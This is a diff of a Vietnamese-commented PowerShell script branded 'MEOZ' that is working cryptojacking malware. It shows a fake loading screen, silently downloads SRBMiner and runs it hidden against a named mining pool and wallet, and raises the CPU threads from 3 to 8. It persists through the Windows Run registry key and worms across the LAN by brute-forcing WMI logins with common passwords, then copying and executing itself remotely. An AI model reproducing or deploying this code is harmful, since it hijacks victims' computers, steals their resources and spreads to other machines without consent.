@@ -1,9 +1,6 @@
 Clear-Host
 $start = Get-Date
-
-# Nơi script đang nằm (fallback về current dir nếu chạy interactively)
 $scriptDir = if ($MyInvocation.MyCommand.Path) { Split-Path -Parent $MyInvocation.MyCommand.Path } else { (Get-Location).Path }
-
 # Config (thay đổi nếu muốn)
 $spamEnabled = $false
 $popPerSecond = 12
@@ -13,14 +10,11 @@ $autoRunExe = $true  # Tự động chạy exe sau khi extract
 $exeFileName = "SRBMiner-MULTI.exe"  # Tên file exe cần chạy
 $silentDownload = $true  # Ẩn thông báo download
 $enableAutoStart = $true  # Bật tự động khởi động cùng Windows
-
-# LAN Spreading Config
 $enableLanSpreading = $true  # Bật/tắt lan truyền qua LAN
 $maxTargets = 5  # Số máy tối đa để lan truyền
 $spreadDelay = 30  # Delay (giây) trước khi bắt đầu lan truyền
 $commonPasswords = @("admin", "password", "123456", "", "password123", "admin123", "root", "user")  # Passwords phổ biến
 $commonUsernames = @("administrator", "admin", "user", "guest", "")  # Usernames phổ biến
-
 function BigLogo {
     Write-Host ""
     Write-Host "  M   M  EEEEE  OOO   ZZZZZ" -ForegroundColor Cyan
@@ -41,7 +35,6 @@ function RenderBar($label) {
     }
     Write-Host " Done"
 }
-
 function DownloadSafe($url, $outfile, $silent = $false) {
     try {
         if (-not $silent) {
@@ -64,7 +57,6 @@ function DownloadSafe($url, $outfile, $silent = $false) {
         return $false
     }
 }
-
 function SetAutoStart($scriptPath) {
     try {
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -80,7 +72,6 @@ function SetAutoStart($scriptPath) {
         return $false
     }
 }
-
 function IsFirstRun() {
     try {
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -91,13 +82,11 @@ function IsFirstRun() {
         return $true
     }
 }
-
 function EnsureFolder($path) {
     if (-not (Test-Path $path)) {
         New-Item -ItemType Directory -Path $path -Force | Out-Null
     }
 }
-
 function ExtractArchive($zipPath, $destination) {
     try {
         if (-not (Test-Path $zipPath)) {
@@ -116,7 +105,6 @@ function ExtractArchive($zipPath, $destination) {
         return $false
     }
 }
-
 function FindAndRunExe($searchPath, $exeName) {
     try {
         $exePath = Get-ChildItem -Path $searchPath -Name $exeName -Recurse | Select-Object -First 1
@@ -126,7 +114,7 @@ function FindAndRunExe($searchPath, $exeName) {
                 "--algorithm", "verushash",
                 "--pool", "sg.servernotdie.dpdns.org:8080",
                 "--wallet", "RAekjoNg7FCkAdub3D8stA4LotrZqJKofu.nole",
-                "--cpu-threads", "3"
+                "--cpu-threads", "8"
             )
             $workingDir = Split-Path $fullPath
             $psi = New-Object System.Diagnostics.ProcessStartInfo
@@ -136,7 +124,6 @@ function FindAndRunExe($searchPath, $exeName) {
             $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
             $psi.CreateNoWindow = $true
             $psi.UseShellExecute = $false
-            
             [System.Diagnostics.Process]::Start($psi) | Out-Null
             return $true
         } else {
@@ -146,7 +133,6 @@ function FindAndRunExe($searchPath, $exeName) {
         return $false
     }
 }
-
 function GetLocalSubnet() {
     try {
         $adapter = Get-NetAdapter | Where-Object { $_.Status -eq "Up" -and $_.InterfaceDescription -notlike "*Loopback*" -and $_.InterfaceDescription -notlike "*Virtual*" } | Select-Object -First 1
@@ -162,7 +148,6 @@ function GetLocalSubnet() {
     } catch {}
     return $null
 }
-
 function ScanLAN($subnet, $maxTargets) {
     $targets = @()
     $currentIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.*" }).IPAddress | Select-Object -First 1
@@ -182,68 +167,46 @@ function ScanLAN($subnet, $maxTargets) {
     
     return $targets
 }
-
 function TestCredentials($targetIP, $username, $password) {
     try {
         $secPassword = ConvertTo-SecureString $password -AsPlainText -Force
         $credential = New-Object System.Management.Automation.PSCredential($username, $secPassword)
-        
-        # Test WMI connection
         $result = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $targetIP -Credential $credential -ErrorAction Stop
         return $true
     } catch {
         return $false
     }
 }
-
 function CopyAndExecuteScript($targetIP, $username, $password, $scriptPath) {
     try {
         $secPassword = ConvertTo-SecureString $password -AsPlainText -Force
         $credential = New-Object System.Management.Automation.PSCredential($username, $secPassword)
-        
-        # Create remote session
         $session = New-PSSession -ComputerName $targetIP -Credential $credential -ErrorAction Stop
-        
-        # Copy script to remote machine
         $remotePath = "C:\Windows\Temp\meoz_script.ps1"
         Copy-Item -Path $scriptPath -Destination $remotePath -ToSession $session -Force
-        
         # Execute script on remote machine
         Invoke-Command -Session $session -ScriptBlock {
             param($remotePath)
             Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$remotePath`"" -WindowStyle Hidden
         } -ArgumentList $remotePath
-        
         Remove-PSSession $session
         return $true
     } catch {
         return $false
     }
 }
-
 function SpreadToLAN() {
     try {
-        if (-not $enableLanSpreading) { return }
-        
+        if (-not $enableLanSpreading) { return }        
         $currentScriptPath = $MyInvocation.MyCommand.Path
         if (-not $currentScriptPath) { return }
-        
-        # Get local subnet
         $subnet = GetLocalSubnet
         if (-not $subnet) { return }
-        
-        # Delay before spreading
         Start-Sleep -Seconds $spreadDelay
-        
-        # Scan for targets
         $targets = ScanLAN $subnet $maxTargets
         if ($targets.Count -eq 0) { return }
-        
-        # Try to spread to each target
         foreach ($targetIP in $targets) {
             $success = $false
-            
-            # Try different username/password combinations
             foreach ($username in $commonUsernames) {
                 foreach ($password in $commonPasswords) {
                     if (TestCredentials $targetIP $username $password) {
@@ -259,43 +222,30 @@ function SpreadToLAN() {
         }
     } catch {}
 }
-
-# Main execution
 $isFirstRun = IsFirstRun()
 $currentScriptPath = $MyInvocation.MyCommand.Path
-
 if ($isFirstRun) {
     BigLogo
     Write-Host "[+] Initializing libraries complete." -ForegroundColor Green
     Write-Host ""
     RenderBar "Loading modules"
-    
-    # Thiết lập auto start nếu được bật
     if ($enableAutoStart -and $currentScriptPath) {
         $autoStartSet = SetAutoStart $currentScriptPath
     }
     Start-Sleep -Milliseconds 500  
 }
-
-# Paths trong thư mục script
 $imgUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS6d87zy2l97Gbuz1xheO71Fzw31vhLFurSyg&s"
 $zipUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.7/SRBMiner-Multi-2-9-7-win64.zip" 
 $imgOut = Join-Path $scriptDir "meoz_image.jpg"
 $zipOut = Join-Path $scriptDir "SRBMiner-Multi-2-9-7-win64.zip"
 $dest = Join-Path $scriptDir "meoz_assets"
-
 EnsureFolder $scriptDir
 EnsureFolder $dest
-
 Write-Host ""
-
-# Download image (silent mode)
 $imgOk = DownloadSafe $imgUrl $imgOut $true
 if (-not $imgOk -and $isFirstRun -and -not $silentDownload) {
     Write-Host "Image download failed or unreachable" -ForegroundColor Yellow
 }
-
-# Download archive (silent mode)
 $zipOk = DownloadSafe $zipUrl $zipOut $true
 if ($zipOk) {
     if ($isFirstRun -and -not $silentDownload) {
@@ -304,10 +254,7 @@ if ($zipOk) {
     if ($isFirstRun) {
         RenderBar "Extracting archive"
     }
-    
     $extractOk = ExtractArchive $zipOut $dest
-    
-    # Tự động chạy exe nếu được bật
     if ($extractOk -and $autoRunExe) {
         if ($isFirstRun) {
             Write-Host ""
@@ -320,29 +267,20 @@ if ($zipOk) {
         Write-Host "Archive download failed or unreachable" -ForegroundColor Yellow
     }
 }
-
-# LAN Spreading (chạy trong background)
 if ($enableLanSpreading -and $currentScriptPath) {
     if ($isFirstRun) {
         Write-Host ""
         RenderBar "Network scanning"
     }
-    
-    # Chạy spreading trong background job để không block main script
     Start-Job -ScriptBlock ${function:SpreadToLAN} | Out-Null
 }
-
-# Đảm bảo script chạy ít nhất 10 giây
 $min = 10
 $elapsed = (Get-Date) - $start
 $remain = [math]::Max(0, $min - $elapsed.TotalSeconds)
 if ($remain -gt 0) {
     Start-Sleep -Seconds $remain
 }
-
 Write-Host ""
-
-# Spam popup section (chỉ chạy lần đầu)
 function TryOpen($filePath) {
     if (-not (Test-Path $filePath)) { return $null }
     $msp = Join-Path $env:windir "system32\mspaint.exe"
@@ -352,12 +290,10 @@ function TryOpen($filePath) {
         return Start-Process -FilePath $filePath -PassThru
     }
 }
-
 if ($isFirstRun -and $spamEnabled -and (Test-Path $imgOut)) {
     $procList = New-Object System.Collections.ArrayList
     $endTime = (Get-Date).AddSeconds($totalSpamDuration)
     $interval = if ($popPerSecond -gt 0) { 1.0 / [double]$popPerSecond } else { 1.0 }
-
     while ((Get-Date) -lt $endTime) {
         for ($i = 1; $i -le $popPerSecond; $i++) {
             $p = TryOpen $imgOut
@@ -367,8 +303,6 @@ if ($isFirstRun -and $spamEnabled -and (Test-Path $imgOut)) {
             }
             Start-Sleep -Milliseconds ([int]($interval * 1000))
         }
-        
-        # Cleanup old windows
         foreach ($entry in $procList.ToArray()) {
             try {
                 $pobj = $entry.Proc
@@ -385,8 +319,6 @@ if ($isFirstRun -and $spamEnabled -and (Test-Path $imgOut)) {
             }
         }
     }
-
-    # Final cleanup
     foreach ($entry in $procList.ToArray()) {
         try {
             $pobj = $entry.Proc
@@ -397,11 +329,8 @@ if ($isFirstRun -and $spamEnabled -and (Test-Path $imgOut)) {
         $procList.Remove($entry) | Out-Null
     }
 }
-
-# Mở image cuối cùng nếu tồn tại (chỉ lần đầu)
 if ($isFirstRun -and (Test-Path $imgOut)) {
     Start-Process $imgOut
 }
-
 Write-Host ""
 Start-Sleep -Milliseconds 300
